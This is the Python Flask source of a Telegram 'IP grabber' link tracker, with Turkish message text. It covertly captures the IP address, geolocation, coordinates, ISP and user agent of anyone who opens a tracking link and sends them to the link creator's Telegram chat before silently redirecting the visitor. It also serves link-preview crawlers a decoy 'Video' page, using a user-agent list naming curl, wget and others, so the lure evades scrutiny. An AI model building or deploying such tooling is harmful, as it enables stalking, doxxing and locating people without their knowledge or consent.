from flask import Flask, request, abort
import os
import requests as _req
import html as _html
import tracking_store

app = Flask(__name__)

TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')

_BOT_UA_KEYWORDS = [
    'telegrambot', 'twitterbot', 'facebookexternalhit', 'facebot',
    'linkedinbot', 'whatsapp', 'slackbot', 'discordbot',
    'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
    'python-requests', 'python-urllib', 'curl/', 'wget/', 'libwww',
    'scrapy', 'okhttp', 'java/', 'apache-httpclient', 'go-http-client',
    'axios/', 'node-fetch', 'got/', 'undici', 'aiohttp',
]


def _is_bot(ua: str) -> bool:
    ua_lower = ua.lower()
    return not ua_lower or any(k in ua_lower for k in _BOT_UA_KEYWORDS)


@app.route('/')
def home():
    return "AZRxGUARD Bot is running!"


@app.route('/track/<token>')
def track(token):
    row = tracking_store.get(token)
    if not row:
        abort(404)
    dest_url, chat_id = row

    ua = request.headers.get('User-Agent', '')

    safe_dest = _html.escape(dest_url, quote=True)

    if _is_bot(ua):
        return (
            f'<!DOCTYPE html><html><head>'
            f'<title>Loading...</title>'
            f'<meta property="og:title" content="Video" />'
            f'<meta property="og:type" content="video.other" />'
            f'</head><body>Loading...</body></html>'
        ), 200

    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    ua_display = ua[:300]

    geo = {}
    try:
        r = _req.get(
            f'http://ip-api.com/json/{ip}'
            f'?fields=status,country,countryCode,regionName,city,zip,'
            f'timezone,lat,lon,isp,org,mobile,proxy,hosting,query',
            timeout=5
        )
        if r.status_code == 200:
            geo = r.json()
    except Exception:
        pass

    lat     = geo.get('lat', '')
    lon     = geo.get('lon', '')
    harita  = f'https://maps.google.com/?q={lat},{lon}' if lat and lon else None
    proxy   = geo.get('proxy', False)
    hosting = geo.get('hosting', False)
    mobile  = geo.get('mobile', False)

    if proxy:     tip = '🔴 Proxy/VPN'
    elif hosting: tip = '🟠 Hosting/Sunucu'
    elif mobile:  tip = '📱 Mobil Hat'
    else:         tip = '✅ Normal Kullanıcı'

    def e(v):
        return _html.escape(str(v) if v else '—')

    msg = (
        f"🎯 <b>LİNK AÇILDI — IP YAKALANDI</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>IP Adresi:</b> <code>{e(geo.get('query', ip))}</code>\n"
        f"🏳️ <b>Ülke:</b> {e(geo.get('country'))} ({e(geo.get('countryCode'))})\n"
        f"🏙️ <b>Şehir / Bölge:</b> {e(geo.get('city'))} / {e(geo.get('regionName'))}\n"
        f"📮 <b>Posta Kodu:</b> {e(geo.get('zip'))}\n"
        f"🕐 <b>Saat Dilimi:</b> <code>{e(geo.get('timezone'))}</code>\n"
        f"📡 <b>Koordinat:</b> <code>{lat}, {lon}</code>\n"
    )
    if harita:
        msg += f'🗺️ <a href="{harita}">Google Maps\'te Gör</a>\n'
    msg += (
        f"\n"
        f"📶 <b>ISP:</b> {e(geo.get('isp'))}\n"
        f"🏛️ <b>Org:</b> {e(geo.get('org'))}\n"
        f"📱 <b>Mobil Hat:</b> {'✅ Evet' if mobile else '❌ Hayır'}\n"
        f"🛡️ <b>IP Türü:</b> {tip}\n\n"
        f"🖥️ <b>User Agent:</b>\n<code>{e(ua_display)}</code>\n\n"
        f"🔗 <b>Hedef Link:</b> {e(dest_url)}"
    )

    if TELEGRAM_TOKEN and chat_id:
        try:
            _req.post(
                f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                json={
                    'chat_id': chat_id,
                    'text': msg,
                    'parse_mode': 'HTML',
                    'disable_web_page_preview': True
                },
                timeout=5
            )
        except Exception:
            pass

    return (
        f'<!DOCTYPE html><html><head>'
        f'<meta http-equiv="refresh" content="0;url={safe_dest}" />'
        f'<script>window.location.replace("{safe_dest}");</script>'
        f'</head><body>Yönlendiriliyor...</body></html>'
    )


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
